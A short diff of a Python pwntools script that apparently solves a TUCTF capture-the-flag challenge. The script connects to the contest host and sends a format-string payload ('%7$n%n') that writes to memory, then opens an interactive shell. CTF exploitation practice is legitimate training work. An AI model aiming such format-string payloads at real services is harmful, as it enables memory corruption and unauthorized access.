@@ -1,4 +1,4 @@
-`#coding: utf-8
+#coding: utf-8
 from pwn import *
 
 IP = "chal.tuctf.com"
@@ -8,4 +8,4 @@ r = remote(IP, PORT)
 p = "%7$n%n\x00"
 
 r.send(p)
-r.interactive()`
+r.interactive()
